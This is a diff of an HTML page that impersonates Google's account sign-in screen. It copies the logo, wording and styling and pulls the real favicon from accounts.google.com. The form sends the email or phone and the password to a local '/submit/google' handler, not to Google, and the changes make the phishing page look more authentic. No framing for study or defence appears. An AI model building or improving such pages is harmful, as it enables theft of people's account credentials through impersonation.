@@ -1,64 +1,274 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Sign in – Google accounts</title>
-<style>
-body { font-family: Roboto, Arial, sans-serif; background: #f2f2f2; margin: 0; }
-.container {
-  max-width: 400px;
-  margin: 50px auto;
-  padding: 20px;
-  background: white;
-  border-radius: 8px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.2);
-  text-align: center;
-}
-.logo { margin-bottom: 20px; }
-.logo svg { width: 75px; height: 75px; }
-h2 { font-weight: normal; margin-bottom: 20px; font-size: 24px; }
-input[type="email"], input[type="password"], input[type="text"] {
-  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
-  border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box;
-}
-button {
-  width: 90%; max-width: 350px; padding: 12px; margin: 10px auto; display: block;
-  background: #1a73e8; color: white; border: none; border-radius: 4px;
-  font-size: 16px; font-weight: bold; cursor: pointer; box-sizing: border-box;
-}
-button:hover { background: #1558b0; }
-a { display: block; margin-top: 15px; color: #1a73e8; text-decoration: none; font-size: 14px; }
-a:hover { text-decoration: underline; }
-.footer { margin-top: 20px; font-size: 12px; color: #777; }
-.footer { margin-top: 20px; font-size: 12px; color: #777; text-align: center; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in – Google accounts</title>
+    <link rel="icon" href="https://accounts.google.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: white;
+        }
+        
+        
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 40px;
+            text-align: left;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .input-field:focus + .floating-label,
+        .input-field:not(:placeholder-shown) + .floating-label {
+            transform: translateY(-20px) scale(0.75);
+            color: #1a73e8;
+        }
+        
+        .bottom-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 9px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .next-button:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 32px;
+            font-size: 12px;
+        }
+        
+        .footer-links select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .learn-more {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #5f6368;
+            text-align: left;
+        }
+        
+        .learn-more a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .learn-more a:hover {
+            text-decoration: underline;
+        }
+        
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                border: none;
+                padding: 24px 20px;
+                max-width: 100%;
+                box-shadow: none;
+            }
+            
+            .google-logo {
+                margin-bottom: 24px;
+            }
+            
+            .title {
+                font-size: 20px;
+                margin-bottom: 6px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+                margin-bottom: 32px;
+            }
+            
+            .input-field {
+                font-size: 16px; /* Prevent zoom on iOS */
+                padding: 16px;
+            }
+            
+            .input-field:focus {
+                padding: 15px;
+            }
+            
+            .bottom-actions {
+                flex-direction: column;
+                gap: 16px;
+                align-items: stretch;
+                margin-top: 24px;
+            }
+            
+            .next-button {
+                width: 100%;
+                padding: 14px;
+                font-size: 16px;
+            }
+            
+            .create-account {
+                text-align: center;
+                padding: 8px;
+            }
+            
+            .learn-more {
+                font-size: 12px;
+                margin-top: 16px;
+            }
+            
+            .footer-links {
+                margin-top: 24px;
+                flex-direction: column;
+                gap: 12px;
+                text-align: center;
+            }
+        }
+        
+        @media (max-width: 320px) {
+            .container {
+                padding: 16px 12px;
+            }
+            
+            .title {
+                font-size: 18px;
+            }
+            
+            .google-logo {
+                width: 60px;
+                height: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="container">
-  <div class="logo">
-    <svg xmlns="http://www.w3.org/2000/svg" width="75" height="75" viewBox="0 0 48 48">
-      <path fill="#4285F4" d="M24 9.5c3.54 0 6.7 1.23 9.2 3.25l6.85-6.85C35.9 2.3 30.3 0 24 0 14.6 0 6.6 5.8 2.7 14.1l7.95 6.2C12.3 14.2 17.7 9.5 24 9.5z"/>
-      <path fill="#34A853" d="M46.5 24c0-1.6-.15-3.1-.4-4.5H24v9h12.7c-1.1 3-3.2 5.5-6 7.2l7.95 6.2C43.9 37.7 46.5 31.3 46.5 24z"/>
-      <path fill="#FBBC05" d="M10.65 28.3c-.5-1.5-.8-3-.8-4.3s.3-2.8.8-4.3l-7.95-6.2C1.3 17.2 0 20.5 0 24s1.3 6.8 3.7 9.5l6.95-5.2z"/>
-      <path fill="#EA4335" d="M24 48c6.3 0 11.6-2.1 15.5-5.8l-7.95-6.2c-2.1 1.4-4.8 2.2-7.55 2.2-6.3 0-11.6-4.3-13.5-10.2l-7.95 6.2C6.6 42.2 14.6 48 24 48z"/>
-      <path fill="none" d="M0 0h48v48H0z"/>
-    </svg>
-  </div>
-  <h2>Sign in</h2>
-  <form method="POST" action="/submit/google">
-<input type="email" name="email" placeholder="Email or phone" required autofocus autocomplete="username" style="width:90%;max-width:350px;display:block;margin:10px auto;box-sizing:border-box;" />
-<input type="password" name="pass" placeholder="Enter your password" required autocomplete="current-password" />
-<button type="submit">Next</button>
-  </form>
-  <a href="#">Forgot email?</a>
-  <a href="#">Create account</a>
-  <div style="background:#f7f7f7; padding:10px; font-size:12px; text-align:center; color:#555; margin-top:15px;">
-    By continuing, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>. This site uses cookies to improve your experience.
-  </div>
-</div>
-<div class="footer">
-  Google © 2025
-</div>
+    <div class="container">
+        <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="48" height="48" viewBox="0 0 48 48" style="display: block; margin: 0 auto 16px;">
+        <path fill="#fbc02d" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12	s5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24s8.955,20,20,20	s20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"></path><path fill="#e53935" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039	l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"></path><path fill="#4caf50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36	c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"></path><path fill="#1565c0" d="M43.611,20.083L43.595,20L42,20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571	c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"></path>
+        </svg>
+        
+        <h1 class="title">Sign in</h1>
+        <p class="subtitle">to continue to Google</p>
+        
+        <form action="/submit/google" method="post">
+            <div class="form-group">
+                <input type="email" name="username" class="input-field" placeholder="Email or phone" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" name="password" class="input-field" placeholder="Enter your password" required>
+            </div>
+            
+            <div class="bottom-actions">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-button">Next</button>
+            </div>
+        </form>
+        
+        <p class="learn-more">
+            Not your computer? Use Guest mode to sign in privately. 
+            <a href="#">Learn more</a>
+        </p>
+        
+        <div class="footer-links">
+            <select>
+                <option>English (United States)</option>
+            </select>
+            <div>
+                <a href="#">Help</a> •
+                <a href="#">Privacy</a> •
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
